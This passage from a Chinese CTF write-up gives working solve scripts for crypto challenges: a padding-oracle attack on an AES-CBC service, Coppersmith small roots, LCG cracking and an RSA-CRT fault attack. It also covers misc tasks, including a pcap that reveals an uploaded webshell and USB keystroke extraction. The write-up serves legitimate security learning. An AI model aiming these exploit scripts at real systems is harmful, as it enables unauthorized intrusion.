class="line"><span class="string"></span></span><br><span class="line"><span class="string">please select your option:</span></span><br><span class="line"><span class="string">1. Unlock Secret Entry</span></span><br><span class="line"><span class="string">2. Help</span></span><br><span class="line"><span class="string">3. Exit</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">valid_code = [<span class="number">1033</span>,<span class="number">3329</span>,<span class="number">4431</span>,<span class="number">5052</span>]</span><br><span class="line"></span><br><span class="line">auth_context_pattern = re.<span class="built_in">compile</span>(<span class="string">r&#x27;^SoNP#[0-9]&#123;4&#125;$&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">auth_context_checker</span>(<span class="params">ctx : <span class="built_in">bytes</span></span>):</span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> ctx:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">chr</span>(c) <span class="keyword">not</span> <span class="keyword">in</span> string.printable:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> auth_context_pattern.<span class="keyword">match</span>(ctx.decode()) : <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unlock</span>():</span><br><span class="line">    token = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">&#x27;Enter your token &gt; &#x27;</span>))</span><br><span class="line">    auth_code = <span class="built_in">bytes</span>.fromhex(<span class="built_in">input</span>(<span class="string">&#x27;Enter your authentication code &gt; &#x27;</span>))</span><br><span class="line"></span><br><span class="line">    cipher = AES.new(key, AES.MODE_CBC,token)</span><br><span class="line">    </span><br><span class="line">    check = cipher.decrypt(auth_code)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        </span><br><span class="line">        msg = unpad(check, <span class="number">16</span>)</span><br><span class="line">        <span class="keyword">if</span> auth_context_checker(msg) <span class="keyword">and</span> <span class="built_in">int</span>(msg[<span class="number">5</span>:].decode()) <span class="keyword">in</span> valid_code:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;door unlocked, here is your reward&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;get out&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;oops, something wrong&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">help</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;To unlock the door, please enter your token and authentication code.&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="built_in">print</span>(menu)</span><br><span class="line">    opt = <span class="built_in">input</span>(<span class="string">&#x27;&gt; &#x27;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        opt = <span class="built_in">int</span>(opt)</span><br><span class="line">        <span class="keyword">if</span> opt == <span class="number">1</span>:</span><br><span class="line">            unlock()</span><br><span class="line">        <span class="keyword">elif</span> opt == <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">help</span>()</span><br><span class="line">        <span class="keyword">elif</span> opt == <span class="number">3</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;invalid option&#x27;</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;oh no, something wrong!&#x27;</span>)</span><br><span class="line">        </span><br></pre></td></tr></table></figure><p>解密出来的check需要满足<code>SoNP#</code>+4个数字的格式</p><p>每次连接都是用的同一个key</p><p>由于有<strong>显示报错信息</strong>，所以可以使用<strong>padding oracle攻击</strong></p><p>先随机生成一个16位密文C2</p><p>然后用padding oracle的方法试出解密后的<strong>中间状态I2</strong></p><img src="/posts/04d1547e2896/image-20231009091935046.png" class="" title="image-20231009091935046"><p>然后将中间状态与最后带padding的正确明文P2异或得到IV</p><p>解题exp如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"></span><br><span class="line">authentication = <span class="string">&#x27;r1ckissohandsome&#x27;</span></span><br><span class="line">check = <span class="string">b&#x27;SoNP#1033&#x27;</span></span><br><span class="line">conn = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27683</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">aes_padding_oracle</span>(<span class="params">conn, cipher</span>):</span><br><span class="line">    mid = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            cur_iv = (<span class="number">15</span> - i) * <span class="string">b&#x27;\x00&#x27;</span> + <span class="built_in">bytes</span>([j]) + strxor(mid, <span class="built_in">bytes</span>([i + <span class="number">1</span>] * (i)))</span><br><span class="line">            <span class="keyword">assert</span> <span class="built_in">len</span>(cur_iv) == <span class="number">16</span></span><br><span class="line">            conn.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">            conn.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">            conn.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">            conn.sendline(cur_iv.<span class="built_in">hex</span>().encode())</span><br><span class="line">            conn.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">            conn.sendline(authentication.encode().<span class="built_in">hex</span>().encode())</span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;something wrong&quot;</span> <span class="keyword">in</span> conn.recvline():</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">b&quot;find it&quot;</span>, cur_iv)</span><br><span class="line">                mid = <span class="built_in">bytes</span>([j^(i+<span class="number">1</span>)]) + mid</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(mid) != i + <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">b&quot;not found!!!!!!!!!!!!&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">b&quot;mid is &quot;</span>, mid)</span><br><span class="line">    <span class="keyword">return</span> mid</span><br><span class="line"><span class="comment"># guess block 1</span></span><br><span class="line">iv = <span class="built_in">hex</span>(<span class="built_in">int</span>(aes_padding_oracle(conn,authentication).<span class="built_in">hex</span>(),<span class="number">16</span>)^<span class="built_in">int</span>(pad(check,<span class="number">16</span>).<span class="built_in">hex</span>(),<span class="number">16</span>)).encode()[<span class="number">2</span>:]</span><br><span class="line"><span class="built_in">print</span>(iv)</span><br><span class="line">conn.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">conn.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">conn.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">conn.sendline(iv)</span><br><span class="line">conn.recvuntil(<span class="string">b&quot;&gt; &quot;</span>)</span><br><span class="line">conn.sendline(authentication.encode().<span class="built_in">hex</span>().encode())</span><br><span class="line">conn.interactive()</span><br></pre></td></tr></table></figure><p>得到flag</p><img src="/posts/04d1547e2896/image-20231009102500418.png" class="" title="image-20231009102500418"><h3 id="小明的密码题"><a href="#小明的密码题" class="headerlink" title="小明的密码题"></a>小明的密码题</h3><p>8位未知，很显然不能爆破</p><p>那么就是明文高位已知攻击</p><p>exp脚本如下</p><p>由于位数泄露的比较多，不太需要调参</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">131889193322687215946601811511407251196213571687093913054335139712633125177496800529685285401802802683116451016274353008428347997732857844896393358010946452397522017632024075459908859131965234835870443110233375074265933004741459359128684375786221535003839961829770182916778717973782408036072622166388614214899</span></span><br><span class="line">e = <span class="number">5</span></span><br><span class="line">c = <span class="number">11188201757361363141578235564807411583085091933389381887827791551369738717117549969067660372214366275040055647621817803877495473068767571465521881010707873686036336475554105314475193676388608812872218943728455841652208711802376453034141883236142677345880594246879967378770573385522326039206400578260353074379</span></span><br><span class="line">flag = <span class="string">b&#x27;sm4ll_r00ts_is_brilliant#&#x27;</span></span><br><span class="line"></span><br><span class="line">mbar = <span class="built_in">int</span>(codecs.encode(flag,  <span class="string">&#x27;hex&#x27;</span>), <span class="number">16</span>) &lt;&lt;<span class="number">64</span></span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = (mbar + x)^e - c</span><br><span class="line">f = f.monic()</span><br><span class="line">x0 = f.small_roots()[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(mbar + x0))</span><br></pre></td></tr></table></figure><p>得到flag</p><img src="/posts/04d1547e2896/image-20231009111205802.png" class="" title="image-20231009111205802"><h3 id="babyrandom"><a href="#babyrandom" class="headerlink" title="babyrandom"></a>babyrandom</h3><p>基本上<strong>5组以上的密文</strong>就能破解lcg线性同余生成器</p><p>脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> gcd</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, m</span>):</span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_unknown_increment</span>(<span class="params">states, modulus, multiplier</span>):</span><br><span class="line">    increment = (states[<span class="number">1</span>] - states[<span class="number">0</span>]*multiplier) % modulus</span><br><span class="line">    <span class="keyword">return</span> modulus, multiplier, increment</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_unknown_multiplier</span>(<span class="params">states, modulus</span>):</span><br><span class="line">    multiplier = (states[<span class="number">2</span>] - states[<span class="number">1</span>]) * modinv(states[<span class="number">1</span>] - states[<span class="number">0</span>], modulus) % modulus</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_increment(states, modulus, multiplier)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crack_unknown_modulus</span>(<span class="params">states</span>):</span><br><span class="line">    diffs = [s1 - s0 <span class="keyword">for</span> s0, s1 <span class="keyword">in</span> <span class="built_in">zip</span>(states, states[<span class="number">1</span>:])]</span><br><span class="line">    zeroes = [t2*t0 - t1*t1 <span class="keyword">for</span> t0, t1, t2 <span class="keyword">in</span> <span class="built_in">zip</span>(diffs, diffs[<span class="number">1</span>:], diffs[<span class="number">2</span>:])]</span><br><span class="line">    modulus = <span class="built_in">abs</span>(reduce(gcd, zeroes))</span><br><span class="line">    <span class="keyword">return</span> crack_unknown_multiplier(states, modulus)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># N[i+1] = (A*N[i]+B) % M</span></span><br><span class="line"><span class="comment"># A,B,N均未知</span></span><br><span class="line">sequence = []</span><br><span class="line">conn = remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28596</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    conn.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">    conn.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sequence.append(<span class="built_in">int</span>(conn.recvline(keepends=<span class="literal">False</span>)))</span><br><span class="line"><span class="built_in">print</span>(sequence)</span><br><span class="line">modulus, multiplier, increment = crack_unknown_modulus(sequence)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;A = &#x27;</span>+<span class="built_in">str</span>(multiplier))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;B = &#x27;</span>+<span class="built_in">str</span>(increment))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;N = &#x27;</span>+<span class="built_in">str</span>(modulus))</span><br><span class="line">MMI = <span class="keyword">lambda</span> A, n,s=<span class="number">1</span>,t=<span class="number">0</span>,N=<span class="number">0</span>: (n &lt; <span class="number">2</span> <span class="keyword">and</span> t%N <span class="keyword">or</span> MMI(n, A%n, t, s-A//n*t, N <span class="keyword">or</span> n),-<span class="number">1</span>)[n&lt;<span class="number">1</span>] <span class="comment">#逆元计算</span></span><br><span class="line">ani=MMI(multiplier,modulus)</span><br><span class="line">flag = (ani*(sequence[<span class="number">0</span>]-increment))%modulus</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(flag))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>得到flag</p><img src="/posts/04d1547e2896/image-20231008225346248.png" class="" title="image-20231008225346248"><h3 id="eazy-crt"><a href="#eazy-crt" class="headerlink" title="eazy_crt"></a>eazy_crt</h3><p>这题一开始搞错了思路，跑去爆破r1,r3这些随机数去了</p><p>后面才意识到题目的源码是一个RSA_CRT签名的加密过程</p><p>同时在加密过程中<strong>计算Sp时出现错误</strong></p><p>此时应该考虑<strong>RSA CRT 错误攻击(fault attack)</strong></p><p>如果我们能够知道e、n、要签名的明文m以及错误的签名S_，就能实施攻击分解n</p><p><strong>原理</strong>如下：</p><p>如果在计算部分签名$S<em>{p} $和$S</em>{q} $时没有错误，加密过程一切正常，则在产生的最终签名$S$有如下性质</p><p>$\begin{cases}s^e \equiv m [p]\s^e \equiv m [q]\end{cases} \Rightarrow \begin{cases}s^e - m\equiv 0 [p]\s^e - m \equiv 0 [q]\end{cases} \Rightarrow \begin{cases}s^e - m= k_1p \s^e - m =  k_2q\end{cases} \Rightarrow s^e - m=k_3pq$</p><p>$p$和$q$为$S^e-m$的因数，又因为$n=pq$，则$gcd(S^e - m, n) = n$</p><p>如果计算部分钱签名，例如计算$S_p$时出错，则</p><p>$\begin{cases}s^e \not\equiv m [p]\s^e \equiv m [q]\end{cases} \Rightarrow \begin{cases}s^e - m\not\equiv 0 [p]\s^e - m \equiv 0 [q]\end{cases} \Rightarrow \begin{cases}s^e - m\neq k_1p \s^e - m =  k_2q\end{cases} \Rightarrow s^e - m=k_3q$</p><p>此时便可利用$gcd(S^e - m, n) = q$计算出$q$</p><p>下面是exp脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> *</span><br><span class="line">S_ = <span class="number">5510086561842250138908875342533294108331951659612671466695801343686972919443402163401521040457640602756777910081639191753436122171756174730531385913865951826869995984787102439679170684422717808771260217541439878677750508065703064081375473845405916674327932798153100574555933448570618732842365795738120491532398081467312017203933413296779070611024124965772787502242499016884537233028947865288037718074352448773759363242111080540630360902388540661831992776707600133253329779003707938065020121645530719140954554800986771763343191398210100325971573069812381693089384221441735278736889673500218274673196333806222266248844379127652366</span></span><br><span class="line">S = <span class="number">11422623501509574650959962952004985925543723972567988534433510888436662069119800576321679344425052011563473005275801787271861671898318523033415642388512047035650991047953319601346912194462122313366888126100093635969476696871403883687946617575837061694813669883782221006701704487938500886952347003631626326127154081787016692856628561200386941683756397734100698520464199249811238013146899352390453500132666840606585760306723894654933077094375810666168464835756607377998959675132305971721109661644231613426322675350973373434138686086023265910883509514575554429502214217460059521619625693750938117427832654792355808803321</span></span><br><span class="line">n = <span class="number">25505131259827344749407187081729819350996141100990518281765117676936124636084125400315049858697199427401342785804654120926568235761577895862889807660442415521870277729420875825744007886870384790308986342360349597392841568418588521694478184632631896474390291958350681472768485356865513284619086754437723630874827593280089682939629265210875169009057935264259019861755270570945614034505771690412042781423771110441028258110022746603974882162934979726300741541857444013708508946471384525030286343828680432038605288717842755346907256658746733811881247992925881684393431852248253701825024590345480994598867741811599162649467</span></span><br><span class="line">m=<span class="number">2180240512138982889935733758776025289492848542072999905411903898302427496814336475436552230920326681809745778470583226987</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">q = gmpy2.gcd(<span class="built_in">pow</span>(S_, e, n)-m, n)</span><br><span class="line">p=n//q</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;flag&#123;&#x27;</span> + md5(<span class="built_in">str</span>(p).encode()).hexdigest() + <span class="string">&#x27;&#125;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到flag</p><img src="/posts/04d1547e2896/image-20231009193031332.png" class="" title="image-20231009193031332"><h2 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h2><h3 id="阳光开朗大男孩"><a href="#阳光开朗大男孩" class="headerlink" title="阳光开朗大男孩"></a>阳光开朗大男孩</h3><p>题目如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># secret.txt</span><br><span class="line">法治自由公正爱国公正敬业法治和谐平等友善敬业法治富强公正民主法治和谐法治和谐法治法治公正友善敬业法治文明公正自由平等诚信平等公正敬业法治和谐平等友善敬业法治和谐和谐富强和谐富强和谐富强平等友善敬业公正爱国和谐自由法治文明公正自由平等友善敬业法治富强和谐自由法治和谐法治和谐法治和谐法治法治和谐富强法治文明公正自由公正自由公正自由公正自由</span><br><span class="line"># flag.txt</span><br><span class="line">🙃💵🌿🎤🚪🌏🐎🥋🚫😆😍🌊⏩🔬🚹✉☀☺🚹🐅🎤🛩💵🌿🌊🚰😊🌊✉🐎❓🎈🌉👑🎅📮🥋👣🕹🚪☀🔄🚫🐍❓🐍😊☀🔬🍍🤣🎈🥋🙃👑🌏🐎🌊📮😂💵🏹👉❓😇🍴💧☺💵😁☃👉🎅👁☂🌿👉🍴🌪👌🍴🍵🖐😇🍍😀🗒🗒</span><br></pre></td></tr></table></figure><p>很显然，一个是<strong>核心价值观编码</strong>，另一个是<strong>base100</strong></p><p>解码secret.txt得到<code>this_password_is_s000_h4rd_p4sssw0rdddd</code></p><p>该base100使用在线解密网站解密不了</p><p>尝试寻找带密码的emoji解密，密码为<code>s000_h4rd_p4sssw0rdddd</code></p><p><a href="https://aghorler.github.io/emoji-aes/#decrypt">emoji-aes (aghorler.github.io)</a></p><img src="/posts/04d1547e2896/image-20231009011607739.png" class="" title="image-20231009011607739"><h3 id="2-分析"><a href="#2-分析" class="headerlink" title="2-分析"></a>2-分析</h3><p>分析前面的http数据包，可以发现攻击者正在扫描目录</p><p>搜索username字符串</p><p>找到登录名<code>best_admin</code></p><img src="/posts/04d1547e2896/image-20231009221100789.png" class="" title="image-20231009221100789"> <p>搜索system可以找到上传的远程命令执行漏洞，webshell文件为<code>wh1t3g0d.php</code>，而漏洞文件为<code>index.php</code></p><img src="/posts/04d1547e2896/image-20231009221914555.png" class="" title="image-20231009221914555"><p><code>best_admin_index.php_wh1t3g0d.php</code></p><p>flag为<code>flag&#123;4069afd7089f7363198d899385ad688b&#125;</code></p><h3 id="大怨种"><a href="#大怨种" class="headerlink" title="大怨种"></a>大怨种</h3><p>由于是gif文件，丢进stegsolve分解帧</p><p>得到一个二维码以及一张只有部分的图片</p><img src="/posts/04d1547e2896/frame2.png" class="" title="frame2"><img src="/posts/04d1547e2896/part.png" class="" title="part"><p>查阅资料后发现这不是二维码，而是<strong>汉信码</strong></p><h3 id="键盘侠"><a href="#键盘侠" class="headerlink" title="键盘侠"></a>键盘侠</h3><p>首先过滤指定USB流量另存为单独流量包usb,pcapng</p><img src="/posts/04d1547e2896/image-20231010170248276.png" class="" title="image-20231010170248276"><p>使用tshark命令提取USB指定的4个字节</p><p><code>tshark.exe -r usb.pcapng -T fields -e usb.capdata &gt; usbdata.txt</code></p><p>得到的数据如下，中间没有冒号，需要使用脚本转换一下</p><img src="/posts/04d1547e2896/image-20231010170723244.png" class="" title="image-20231010170723244"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;usbdata.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    lines = file.readlines()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;newusbdata.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">        line = line.strip()</span><br><span class="line">        grouped_line = <span class="string">&#x27;:&#x27;</span>.join([line[i:i + <span class="number">2</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(line), <span class="number">2</span>)])</span><br><span class="line">        file.write(grouped_line + <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure><p>编写python脚本将提取出来的所有usbhid.data转化为敲击内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">normalKeys = &#123;<span class="string">&quot;04&quot;</span>:<span class="string">&quot;a&quot;</span>, <span class="string">&quot;05&quot;</span>:<span class="string">&quot;b&quot;</span>, <span class="string">&quot;06&quot;</span>:<span class="string">&quot;c&quot;</span>, <span class="string">&quot;07&quot;</span>:<span class="string">&quot;d&quot;</span>, <span class="string">&quot;08&quot;</span>:<span class="string">&quot;e&quot;</span>, <span class="string">&quot;09&quot;</span>:<span class="string">&quot;f&quot;</span>, <span class="string">&quot;0a&quot;</span>:<span class="string">&quot;g&quot;</span>, <span class="string">&quot;0b&quot;</span>:<span class="string">&quot;h&quot;</span>, <span class="string">&quot;0c&quot;</span>:<span class="string">&quot;i&quot;</span>, <span class="string">&quot;0d&quot;</span>:<span class="string">&quot;j&quot;</span>, <span class="string">&quot;0e&quot;</span>:<span class="string">&quot;k&quot;</span>, <span class="string">&quot;0f&quot;</span>:<span class="string">&quot;l&quot;</span>, <span class="string">&quot;10&quot;</span>:<span class="string">&quot;m&quot;</span>, <span class="string">&quot;11&quot;</span>:<span class="string">&quot;n&quot;</span>, <span class="string">&quot;12&quot;</span>:<span class="string">&quot;o&quot;</span>, <span class="string">&quot;13&quot;</span>:<span class="string">&quot;p&quot;</span>, <span class="string">&quot;14&quot;</span>:<span class="string">&quot;q&quot;</span>, <span class="string">&quot;15&quot;</span>:<span class="string">&quot;r&quot;</span>, <span class="string">&quot;16&quot;</span>:<span class="string">&quot;s&quot;</span>, <span class="string">&quot;17&quot;</span>:<span class="string">&quot;t&quot;</span>, <span class="string">&quot;18&quot;</span>:<span class="string">&quot;u&quot;</span>, <span class="string">&quot;19&quot;</span>:<span class="string">&quot;v&quot;</span>, <span class="string">&quot;1a&quot;</span>:<span class="string">&quot;w&quot;</span>, <span class="string">&quot;1b&quot;</span>:<span class="string">&quot;x&quot;</span>, <span class="string">&quot;1c&quot;</span>:<span class="string">&quot;y&quot;</span>, <span class="string">&quot;1d&quot;</span>:<span class="string">&quot;z&quot;</span>,<span class="string">&quot;1e&quot;</span>:<span class="string">&quot;1&quot;</span>, <span class="string">&quot;1f&quot;</span>:<span class="string">&quot;2&quot;</span>, <span class="string">&quot;20&quot;</span>:<span class="string">&quot;3&quot;</span>, <span class="string">&quot;21&quot;</span>:<span class="string">&quot;4&quot;</span>, <span class="string">&quot;22&quot;</span>:<span class="string">&quot;5&quot;</span>, <span class="string">&quot;23&quot;</span>:<span class="string">&quot;6&quot;</span>,<span class="string">&quot;24&quot;</span>:<span class="string">&quot;7&quot;</span>,<span class="string">&quot;25&quot;</span>:<span class="string">&quot;8&quot;</span>,<span class="string">&quot;26&quot;</span>:<span class="string">&quot;9&quot;</span>,<span class="string">&quot;27&quot;</span>:<span class="string">&quot;0&quot;</span>,<span class="string">&quot;28&quot;</span>:<span class="string">&quot;&lt;RET&gt;&quot;</span>,<span class="string">&quot;29&quot;</span>:<span class="string">&quot;&lt;ESC&gt;&quot;</span>,<span class="string">&quot;2a&quot;</span>:<span class="string">&quot;&lt;DEL&gt;&quot;</span>, <span class="string">&quot;2b&quot;</span>:<span class="string">&quot;\t&quot;</span>,<span class="string">&quot;2c&quot;</span>:<span class="string">&quot;&lt;SPACE&gt;&quot;</span>,<span 